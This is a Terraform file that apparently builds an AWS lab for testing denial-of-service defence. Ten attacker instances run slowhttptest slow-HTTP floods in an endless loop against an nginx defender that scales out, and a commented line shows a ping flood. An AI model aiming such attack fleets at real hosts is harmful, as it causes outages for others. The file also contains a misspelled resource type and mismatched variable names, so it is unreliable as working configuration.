#-----------------------------------------Defence-instance---------------------------------------
resource "aws_instance" "defender_instance" {
  vpc_security_group_ids = [aws_security_groups.defenders_security_group.id]
  ami                    = "${var.ami}"
  instance_type          = "${var.inst_type}"
  subnet_id              = "${var.public_subnet_id}"
  user_data = base64encode(<<-EOT
   #!/bin/bash
    apt-get update -y
    apt-get install nginx -y
    ufw allow 80
    apt-get install slowhttptest -y
EOT
)
  tags = {
    Name = "Defender"
  }
}


#-----------------------------------------Attack-instance---------------------------------------
resource "aws_instance" "atatckers_instance" {
  count                  = 10
  vpc_security_group_ids = [aws_security_group.defenders_security_group.id]
  ami                    = "${var.ami}"
  instance_type          = "${var.inst_type}"
  subnet_id              = "${var.sub_public_subnet}"

  user_data = <<-EOT
    #!/bin/bash
    sudo apt-get update
    sudo apt-get install slowhttptest -y
    sudo apt-get install -y hping3
    TARGET_IP="${aws_instance.defender_instance.public_ip}" # Dynamically fetch defender's IP
    echo "Target IP: $TARGET_IP" > /home/ubuntu/target_ip.txt
   
    while true; do 
    sudo slowhttptest -H -u http://$TARGET_IP -t GET -c 100 -r 30 -p 20 -l 3600 
    sleep 90
    done
    #ping $TARGET_IP -S 65000 -i 0.0000001
  EOT

  depends_on = [
    aws_instance.defender_instance
  ]

  tags = {
    Name        = "Attacker_instance_number${count.index + 1}"
    Environment = "dev"
  }
}

#-----------------------------------------Auto-scaling-group---------------------------------------
resource "aws_launch_template" "defence_launch_template" {

  name_prefix   = "Default-London-instance"
  image_id      = "${var.ami}"
  instance_type = "${var.inst_type}"
  network_interfaces {
    security_groups = [aws_security_group.defenders_security_group.id]
  }
  user_data = base64encode(<<-EOT
   #!/bin/bash
    apt-get update -y
    apt-get install nginx -y
    ufw allow 80
EOT
)
}

resource "aws_autoscaling_group" "defence_asg" {
  desired_capacity   = 1
  min_size           = 1
  max_size           = 5
  vpc_zone_identifier = [var.sub_public_subnet]

  launch_template {
    id = aws_launch_template.defence_launch_template.id
  }
}

resource "aws_autoscaling_policy" "scale_out" {
  name                   = "scale_out-terraform-policy"
  scaling_adjustment     = 1
  adjustment_type        = "ChangeInCapacity"
  cooldown               = 50
  autoscaling_group_name = aws_autoscaling_group.defence_asg.name
}

resource "aws_autoscaling_policy" "scale_in" {
  name                   = "scale-in-terraform-policy"
  scaling_adjustment     = -1
  adjustment_type        = "ChangeInCapacity"
  cooldown               = 100
  autoscaling_group_name = aws_autoscaling_group.defence_asg.name
}

#---------------------------------aws_security_group-----------------------------
resource "aws_security_group" "defenders_security_group" {
  name_prefix = "Security-Group for Defenders"

  vpc_id = "${var.vpc_id}"

  dynamic "ingress" {
    for_each = var.ports
    content {
      from_port   = ingress.value
      to_port     = ingress.value
      protocol    = "tcp"
      cidr_blocks = var.CIDR
    }
  }
  ingress {
    from_port   = -1
    to_port     = -1
    protocol    = "icmp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = var.CIDR
  }

  tags = {
    Name = "Defenders_Security_group"
  }
}


resource "aws_security_group" "alb_sg" {
  name = "alb_sg"

  vpc_id = "${var.vpc_id}"

  dynamic "ingress" {
    for_each = var.ports
    content {
      from_port   = ingress.value
      to_port     = ingress.value
      protocol    = "tcp"
      cidr_blocks = var.CIDR
    }
  }
  ingress {
    from_port   = -1
    to_port     = -1
    protocol    = "icmp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = var.CIDR
  }

  tags = {
    Name = "alb-sg"
  }
}
